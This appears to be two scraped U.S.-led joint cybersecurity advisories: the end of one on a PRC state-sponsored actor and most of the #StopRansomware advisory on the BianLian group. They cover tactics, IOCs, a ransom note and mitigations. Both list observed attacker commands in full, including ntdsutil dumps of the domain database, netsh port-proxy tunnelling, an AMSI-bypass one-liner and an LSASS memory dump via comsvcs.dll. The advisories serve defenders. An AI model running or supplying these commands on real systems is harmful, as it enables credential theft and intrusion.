7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z c:\windows\temp\*""C:\pstools\psexec.exe"" \\{REDACTED} -s cmd /c ""cmd.exe /c ""netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999""""C:\Windows\system32\pcwrun.exe C:\Users\Administrator\Desktop\Win.execmd.exe /C dir /S \\{REDACTED}\c$\Users\{REDACTED} >> c:\windows\temp\{REDACTED}.tmp""cmd.exe"" /c wmic process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""cmd.exe /Q /c *cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1652470932.9400265 2>&1cmd.exe /Q /c net group ""domain admins"" /dom 1>\\127.0.0.1\ADMIN$\__<timestamp value> 2>&1 cmd.exe /Q /c wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\""  1> \\127.0.0.1\ADMIN$\<timestamp value>  2>&1D:\{REDACTED}\xcopy C:\windows\temp\hp d:\{REDACTED} Get-EventLog security -instanceid 4624ldifde.exe -f c:\windows\temp\cisco_up.txt -p subtreemakecab ..\backup\210829-020000.zip ..\webapps\adssp\html\Lock.licmove ""\\<redacted>\c$\users\public\Appfile\registry\SYSTEM"" ..\backup\210829-020000.zipnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcpnetsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999Rar.exe a –{REDACTED} c:\Windows\temp\DMBC2C61.tmpstart-process -filepath c:\windows\temp\<filename>.bat -windowstyle hidden 1
Note: The batch file in question (<filename>.bat) could use any name, and no discernable pattern has been determined at this time.
wmic process call create ""cmd.exe /c mkdir C:\users\public\Appfile & ntdsutil \""ac i ntds\"" ifm \""create full C:\users\public\Appfile\"" q qwmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\""wmic process call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""wmic process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\""
Command Line Patterns
Certain patterns in commands (with asterisks for wildcards) can be used to identify potentially malicious commands:

cmd.exe /C dir /S \\* >> *
cmd.exe /Q /c * 1> \\127.0.0.1\ADMIN$\__*.*>&1
powershell start-process -filepath c:\windows\temp\*.exe -windowstyle hidden

File Paths
The most common paths where files and executables used by the actor have been found include:

C:\Users\Public\Appfile (including subdirectories)
C:\Perflogs (including subdirectories)
C:\Windows\Temp (including subdirectories)

File Names
The file names the actor has previously used for such things as malware, scripts, and tools include:

In addition to the file names and paths above, malicious files names, believed to be randomly created, in the following format have also been discovered: C:\Windows\,a-zA-Z,{8}.exe
SHA-256 File Hashes

f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd
ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31
d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca
472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d
66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7
3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71
41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597
c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99
3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f
fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15
ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484

User-agent
In some cases, the following user-agent string (including the extra spacing) was identified performing reconnaissance activities by this actor:
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0
Note: The spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.
Yara rules




References
Active Directory and domain controller hardening:

Best practices: Best Practices for Securing Active Directory | Microsoft Learn.

CISA regional cyber threats:

PRC state-sponsored activity: China Cyber Threat Overview and Advisories.

Microsoft Threat Intelligence blog:

Volt Typhoon activity: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques | Microsoft Security Blog.

Ntdsutil.exe:

Overview: Ntdsutil | Microsoft Learn.

PowerShell:

Best practices: Keeping PowerShell: Security Measures to Use and Embrace.
Logging configuration: Greater Visibility Through PowerShell Logging | Mandiant | Google Cloud Blog.

Windows command line process auditing:

Overview: Command line process auditing | Microsoft Learn.

Windows Defender Firewall:

Best practices: Configure firewall rules with group policy - Windows Security | Microsoft Learn.
Logging configuration: Configure Windows Firewall logging - Windows Security | Microsoft Learn.

Windows management instrumentation:

Events: Tracing WMI Activity - Win32 apps | Microsoft Learn.
Tracing activity: Tracing WMI Activity - Win32 apps | Microsoft Learn

Windows password spraying:

Logging and playbook configuration: Password spray investigation | Microsoft Learn.

Acknowledgements
The NSA Cybersecurity Collaboration Center, along with the authoring agencies, acknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's Threat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence (MSTI), Palo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry partners for their collaboration on this advisory.
Disclaimer of Endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or favoring by the authoring agencies' governments, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark Recognition
Active Directory®, Microsoft®, PowerShell®, and Windows® are registered trademarks of Microsoft Corporation. MITRE® and ATT&CK® are registered trademarks of The MITRE Corporation.
Purpose
This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Contact
U.S. organizations: Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or cisa.gov/report or to the FBI via your local FBI field office listed at https://www.fbi.gov/contact-us/field-offices.  
NSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov
NSA Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
NSA Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and to access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498 7654.
United Kingdom organizations: Report a significant cyber security incident at ncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
Appendix: MITRE ATT&CK Techniques
The below tables capture all referenced threat actor tactics and techniques in this advisory.







 
 






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
27,"






Actions to take today to mitigate cyber threats from BianLian ransomware and data extortion: 




Strictly limit the use of RDP and other remote desktop services.
Disable command-line and scripting activities and permissions.
Restrict usage of PowerShell and update Windows PowerShell or PowerShell Core to the latest version.







Summary
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Cyber Security Centre (ACSC) are releasing this joint Cybersecurity Advisory to disseminate known BianLian ransomware and data extortion group IOCs and TTPs identified through FBI and ACSC investigations as of March 2023.
BianLian is a ransomware developer, deployer, and data extortion cybercriminal group that has targeted organizations in multiple U.S. critical infrastructure sectors since June 2022. They have also targeted Australian critical infrastructure sectors in addition to professional services and property development. The group gains access to victim systems through valid Remote Desktop Protocol (RDP) credentials, uses open-source tools and command-line scripting for discovery and credential harvesting, and exfiltrates victim data via File Transfer Protocol (FTP), Rclone, or Mega. BianLian group actors then extort money by threatening to release data if payment is not made. BianLian group originally employed a double-extortion model in which they encrypted victims’ systems after exfiltrating the data; however, around January 2023, they shifted to primarily exfiltration-based extortion.
FBI, CISA, and ACSC encourage critical infrastructure organizations and small- and medium-sized organizations to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of BianLian and other ransomware incidents.
Download the PDF version of this report (710kb):


AA23-136A #StopRansomware: BianLian Ransomware Group
(PDF,       644.23 KB
  )


For a downloadable copy of IOCs (35kb), see:


AA23-136A STIX XML
(XML,       34.72 KB
  )


For a downloadable copy of IOCs in JSON format, see AA23-136A.stix.json
Technical Details
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® Tactics and Techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
BianLian is a ransomware developer, deployer, and data extortion cybercriminal group. FBI observed BianLian group targeting organizations in multiple U.S. critical infrastructure sectors since June 2022. In Australia, ACSC has observed BianLian group predominately targeting private enterprises, including one critical infrastructure organization. BianLian group originally employed a double-extortion model in which they exfiltrated financial, client, business, technical, and personal files for leverage and encrypted victims’ systems. In 2023, FBI observed BianLian shift to primarily exfiltration-based extortion with victims’ systems left intact, and ACSC observed BianLian shift exclusively to exfiltration-based extortion. BianLian actors warn of financial, business, and legal ramifications if payment is not made.
Initial Access
BianLian group actors gain initial access to networks by leveraging compromised Remote Desktop Protocol (RDP) credentials likely acquired from initial access brokers [T1078],[T1133] or via phishing [T1566].
Command and Control
BianLian group actors implant a custom backdoor specific to each victim written in Go (see the Indicators of Compromise Section for an example) [T1587.001] and install remote management and access software—e.g., TeamViewer, Atera Agent, SplashTop, AnyDesk—for persistence and command and control [T1105],[T1219].
FBI also observed BianLian group actors create and/or activate local administrator accounts [T1136.001] and change those account passwords [T1098].
Defense Evasion
BianLian group actors use PowerShell [T1059.001] and Windows Command Shell [T1059.003] to disable antivirus tools [T1562.001], specifically Windows defender and Anti-Malware Scan Interface (AMSI). BianLian actors modify the Windows Registry [T1112] to disable tamper protection for Sophos SAVEnabled, SEDEenabled, and SAVService services, which enables them to uninstall these services. See Appendix: Windows PowerShell and Command Shell Activity for additional information, including specific commands they have used.
Discovery
BianLian group actors use a combination of compiled tools, which they first download to the victim environment, to learn about the victim’s environment. BianLian group actors have used:

Advanced Port Scanner, a network scanner used to find open ports on network computers and retrieve versions of programs running on the detected ports [T1046].
SoftPerfect Network Scanner (netscan.exe), a network scanner that can ping computers, scan ports, and discover shared folders [T1135].
SharpShares to enumerate accessible network shares in a domain.
PingCastle to enumerate Active Directory (AD) [T1482]. PingCastle provides an AD map to visualize the hierarchy of trust relationships.

BianLian actors also use native Windows tools and Windows Command Shell to:

Query currently logged-in users [T1033].
Query the domain controller to identify:

All groups [T1069.002].
Accounts in the Domain Admins and Domain Computers groups [1087.002].
All users in the domain.


Retrieve a list of all domain controllers and domain trusts.
Identify accessible devices on the network [T1018].

See Appendix: Windows PowerShell and Command Shell Activity for additional information, including specific commands they have used.
Credential Access
BianLian group uses valid accounts for lateral movement through the network and to pursue other follow-on activity. To obtain the credentials, BianLian group actors use Windows Command Shell to find unsecured credentials on the local machine [T1552.001]. FBI also observed BianLian harvest credentials from the Local Security Authority Subsystem Service (LSASS) memory [T1003.001], download RDP Recognizer (a tool that could be used to brute force RDP passwords or check for RDP vulnerabilities) to the victim system, and attempt to access an Active Directory domain database (NTDS.dit) [T1003.003].
In one case, FBI observed BianLian actors use a portable executable version of an Impacket tool (secretsdump.py) to move laterally to a domain controller and harvest credential hashes from it. Note: Impacket is a Python toolkit for programmatically constructing and manipulating network protocols. Through the Command Shell, an Impacket user with credentials can run commands on a remote device using the Windows management protocols required to support an enterprise network. Threat actors can run portable executable files on victim systems using local user rights, assuming the executable is not blocked by an application allowlist or antivirus solution.
See Appendix: Windows PowerShell and Command Shell Activity for additional information.
Persistence and Lateral Movement
BianLian group actors use PsExec and RDP with valid accounts for lateral movement [T1021.001]. Prior to using RDP, BianLian actors used Command Shell and native Windows tools to add user accounts to the local Remote Desktop Users group, modified the added account’s password, and modified Windows firewall rules to allow incoming RDP traffic [T1562.004]. See Appendix: Windows PowerShell and Command Shell Activity for additional information.
In one case, FBI found a forensic artifact (exp.exe) on a compromised system that likely exploits the Netlogon vulnerability (CVE-2020-1472) and connects to a domain controller.
Collection
FBI observed BianLian group actors using malware (system.exe) that enumerates registry [T1012] and files [T1083] and copies clipboard data from users [T1115].
Exfiltration and Impact
BianLian group actors search for sensitive files using PowerShell scripts (See Appendix: Windows PowerShell and Command Shell Activity) and exfiltrate them for data extortion. Prior to January 2023, BianLian actors encrypted files [T1486] after exfiltration for double extortion.
BianLian group uses File Transfer Protocol (FTP) [T1048] and Rclone, a tool used to sync files to cloud storage, to exfiltrate data [T1537]. FBI observed BianLian group actors install Rclone and other files in generic and typically unchecked folders such as programdata\vmware and music folders. ACSC observed BianLian group actors use Mega file-sharing service to exfiltrate victim data [T1567.002].
BianLian’s encryptor (encryptor.exe) modified all encrypted files to have the .bianlian extension. The encryptor created a ransom note, Look at this instruction.txt, in each affected directory (see Figure 1 for an example ransom note.) According to the ransom note, BianLian group specifically looked for, encrypted, and exfiltrated financial, client, business, technical, and personal files.


Figure 1: BianLian Sample Ransom Note (Look at this instruction.txt)



Your network systems were attacked and encrypted. Contact us in order to restore your data. Don't make any changes in your file structure: touch no files, don't try to recover by yourself, that may lead to it's complete loss.
 To contact us you have to download ""tox"" messenger: https://qtox.github[.]io/
Add user with the following ID to get your instructions:
A4B3B0845DA242A64BF17E0DB4278EDF4BF17E0DB4278EDF85855739667D3E2AE8B89D5439015F07E81D12D767FC
 Alternative way: swikipedia@onionmail[.]org
 Your ID: [Unique ID Assigned to Victim]
 You should know that we have been downloading data from your network for a significant time before the attack: financial, client, business, post, technical and personal files.
In 10 days - it will be posted at our site http://bianlianlbc5an4kgnay3opdemgcryg2 gnay3opdemgcryg2kpfcbgczopmm3dnbz3uaunad[.]onion with links send to your clients, partners, competitors and news agencies, that will lead to a negative impact on your company: potential financial, business and reputational loses.





If a victim refuses to pay the ransom demand, BianLian group threatens to publish exfiltrated data to a leak site maintained on the Tor network. The ransom note provides the Tox ID A4B3B0845DA242A64BF17E0DB4278EDF85855739667D3E2AE8B89D5439015F07E81D12D767FC, which does not vary across victims. The Tox ID directs the victim organization to a Tox chat via https://qtox.github[.]io and includes an alternative contact email address (swikipedia@onionmail[.]org or xxx@mail2tor[.]com). The email address is also the same address listed on the group’s Tor site under the contact information section. Each victim company is assigned a unique identifier included in the ransom note. BianLian group receives payments in unique cryptocurrency wallets for each victim company.
BianLian group engages in additional techniques to pressure the victim into paying the ransom; for example, printing the ransom note to printers on the compromised network. Employees of victim companies also reported receiving threatening telephone calls from individuals associated with BianLian group.
Indicators of Compromise (IOC)
See Table 1 for IOCs obtained from FBI investigations as of March 2023.

Table 1: BianLian Ransomware and Data Extortion Group IOCs


Name
SHA-256 Hash
Description




def.exe
7b15f570a23a5c5ce8ff942da60834a9d0549ea3ea9f34f900a09331325df893
Malware associated with BianLian intrusions, which is an example of a possible backdoor developed by BianLian group.


encryptor.exe
1fd07b8d1728e416f897bef4f1471126f9b18ef108eb952f4b75050da22e8e43
Example of a BianLian encryptor.


exp.exe
0c1eb11de3a533689267ba075e49d93d55308525c04d6aff0d2c54d1f52f5500
Possible NetLogon vulnerability (CVE-2020-1472) exploitation.


system.exe
40126ae71b857dd22db39611c25d3d5dd0e60316b72830e930fba9baf23973ce
Enumerates registry and files. Reads clipboard data.



MITRE ATT&CK Techniques
See Table 2 for all referenced threat actor tactics and techniques in this advisory.



Resource Development


Technique Title
ID
Use




Develop Capabilities: Malware
T1587.001
BianLian group actors developed a custom backdoor used in their intrusions.






Initial Access


Technique Title
ID
Use




External Remote Services
T1133
BianLian group actors used RDP with valid accounts as a means of gaining initial access and for lateral movement.


Phishing
T1566
BianLian group actors used phishing to obtain valid user credentials for initial access.


Valid Accounts
T1078
BianLian group actors used RDP with valid accounts as a means of gaining initial access and for lateral movement.






Execution


Technique Title
ID
Use




Command and Scripting Interpreter: PowerShell
T1059.001
BianLian group actors used PowerShell to disable AMSI on Windows. See Appendix: Windows PowerShell and Command Shell Activity for additional information.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
BianLian group actors used Windows Command Shell to disable antivirus tools, for discovery, and to execute their tools on victim networks. See Appendix: Windows PowerShell and Command Shell Activity for additional information.


Scheduled Task/Job: Scheduled Task
T1053.005
BianLian group actors used a Scheduled Task run as SYSTEM (the highest privilege Windows accounts) to execute a Dynamic Link Library (DLL) file daily. See Appendix: Windows PowerShell and Command Shell Activity for additional information.






Persistence


Technique Title
ID
Use




Account Manipulation
T1098

BianLian group actors changed the password of an account they created.
BianLian actors modified the password of an account they added to the local Remote Desktop Users group.



Create Account: Local Account
T1136.001

BianLian group actors created/activated a local administrator account.
BianLian group actors used net.exe to add a user account to the local Remote Desktop Users group. (See Appendix: Windows PowerShell and Command Shell Activity for more information.)







Defense Evasion


Technique Title
ID
Use




Modify Registry
T1112
BianLian group actors modified the registry to  disable user authentication for RDP connections, allow a user to receive help from Remote Assistance, and disable tamper protection for Sophos SAVEnabled, SEDEenabled, and SAVService services, which enables them to uninstall these services.


Impair Defenses: Disable or Modify Tools
T1562.001
BianLian group actors disabled Windows defender, AMSI, and Sophos SAVEnabled and SEDEenabled tamper protection services. See Appendix: Windows PowerShell and Command Shell Activity for additional information.


Impair Defenses: Disable or Modify System Firewall
T1562.004
BianLian group actors added modified firewalls to allow RDP traffic by adding new rules to the Windows firewall that allow incoming RDP traffic and enable a pre-existing Windows firewall rule group named Remote Desktop.






Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
BianLian group actors accessed credential material stored in the process memory of the LSASS. See Appendix: Windows PowerShell and Command Shell Activity for additional information.


OS Credential Dumping: NTDS
T1003.003
BianLian group actors attempted to access or create a copy of the Active Directory domain database in order to steal credential information and to obtain other information about domain members such as devices, users, and access rights.


Unsecured Credentials: Credentials In Files
T1552.001
BianLian group actors searched local file systems and remote file shares for files containing insecurely stored credentials.






Discovery


Technique Title
ID
Use




Account Discovery: Domain Account
1087.002
BianLian group actors queried the domain controller to identify accounts in the Domain Admins and Domain Computers groups. This information can help adversaries determine which domain accounts exist to aid in follow-on activity.


Domain Trust Discovery
T1482

BianLian group actors used PingCastle to enumerate the AD and map trust relationships.
BianLian group actors retrieved a list of domain trust relationships used to identify lateral movement opportunities in Windows multi-domain/forest environments.



File and Directory Discovery
T1083
BianLian group used malware (system.exe) that enumerates files.


Network Service Discovery
T1046
BianLian actors used Advanced Port Scanner and SoftPerfect Network Scanner to ping computers, scan ports, and identify program versions running on ports.


Network Share Discovery
T1135

BianLian actors used SoftPerfect Network Scanner, which can discover shared folders.
BianLian group actors used SharpShares to enumerate accessible network shares in a domain.



Permission Groups Discovery: Domain Groups
T1069.002
BianLian group actors queried the domain controller to identify groups.


Query Registry
T1012
BianLian group used malware (system.exe) that enumerates registry.


Remote System Discovery
T1018

BianLian group actors attempted to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement.
BianLian group actors retrieved a list of domain controllers.



System Owner User Discovery
T1033
BianLian group actors queried currently logged-in users on a machine.






Lateral Movement


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
BianLian group actors used RDP with valid accounts for lateral movement.






Collection


Technique Title
ID
Use




Clipboard Data
T1115
BianLian group actors’ malware collects data stored in the clipboard from users copying information within or between applications.






Command and Control


Technique Title
ID
Use




Ingress Tool Transfer
T1105
BianLian group actors transferred tools or other files from an external system into a compromised environment.


Remote Access Software
T1219
BianLian group actors used legitimate desktop support and remote access software, such as TeamViewer, Atera, and SplashTop, to establish an interactive command and control channel to target systems within networks.






Exfiltration


Technique Title
ID
Use




Transfer Data to Cloud Account
T1537
BianLian group actors used Rclone to exfiltrate data to a cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.


Exfiltration Over Alternative Protocol
T1048
BianLian group actors exfiltrated data via FTP.


Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
BianLian group actors exfiltrated data via Mega public file-sharing service.






Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
BianLian group actors encrypted data on target systems.



Mitigations
FBI, CISA, and ACSC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable [CPG 2.T].
Using security software to detect instances of remote access software only being loaded in memory.
Requiring authorized remote access solutions only be used from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.


Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.



See NSA Cybersecurity Information sheet Enforce Signed Software Execution Policies for additional guidance.

Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Restrict the use of PowerShell, using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.E].
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E]. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory (AD) level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

In addition, FBI, CISA, and ACSC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data, and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization minimizes the impact of disruption to business practices as they will not be as severe and/or only have irretrievable data [CPG 2.R]. ACSC recommends organizations follow the 3-2-1 backup strategy in which organizations have three copies of data (one copy of production data and two backup copies) on two different media such as disk and tape, with one copy kept off-site for disaster recovery.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints”.
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours from vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks, restricting further lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections, as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

Validate Security Controls
In addition to applying mitigations, FBI, CISA, and ACSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, and ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, and ACSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov, a whole-of-government approach with one central location for U.S. ransomware resources and alerts.
cyber.gov.au for the Australian Government’s central location to report cyber incidents, including ransomware, and to see advice and alerts. The site also provides ransomware advisories for businesses and organizations to help mitigate cyber threats.
CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide for guidance on mitigating and responding to a ransomware attack
For no-cost cyber hygiene services for U.S. organizations,  Cyber Hygiene Services and Ransomware Readiness Assessment.

Reporting
The FBI is seeking any information that can be shared, including boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with BianLian actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at cisa.gov/report. Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ACSC via 1300 CYBER1 (1300 292 371) or by submitting a report cyber.gov.au.
Acknowledgements
Microsoft and Sophos contributed to this advisory.
APPENDIX: WINDOWS PowerSHell and COMMAND SHELL ACTIVITY
Through FBI investigations as of March 2023, FBI has observed BianLian actors use the commands in Table 3. ACSC has observed BianLian actors use some of the same commands.

Table 3: PowerShell and Windows Command Shell Activity


Command
Use




[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,* Static’).SetValue($null,$true) 
Disables the AMSI on Windows. AMSI is a built-in feature on Windows 10 and newer that provides an interface for anti-malware scanners to inspect scripts prior to execution. When AMSI is disabled, malicious scripts may bypass antivirus solutions and execute undetected.


cmd.exe /Q /c for /f “tokens=1,2 delims= “ ^%A in (‘”tasklist /fi “Imagename eq lsass.exe” | find “lsass””’) do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B \Windows\Temp\<file>.csv full
Creates a memory dump lsass.exe process and saves it as a CSV filehttps://attack.mitre.org/versions/v12/techniques/T1003/001/.  BianLian actors used it to harvest credentials from lsass.exe.


